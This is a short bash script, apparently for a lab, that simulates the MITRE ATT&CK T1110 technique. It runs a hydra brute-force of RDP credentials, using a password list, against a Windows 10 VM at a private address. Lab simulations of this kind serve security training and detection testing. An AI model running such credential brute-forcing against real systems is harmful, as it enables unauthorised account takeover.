#!/bin/bash
# MITRE ATT&CK T1110 - RDP Brute Force Simulation
# Target: Windows 10 VM (Victim)
# Attacker Machine: Kali Linux

echo "[*] Simulating controlled RDP Brute Force attack..."

# Exact command executed in the local lab environment:
# -t 4 limits parallel connections to ensure RDP service stability
# -f terminates execution immediately upon finding the first valid credential pair
hydra -t 4 -V -f -l testing -P bad_passwords.txt rdp://10.0.2.15
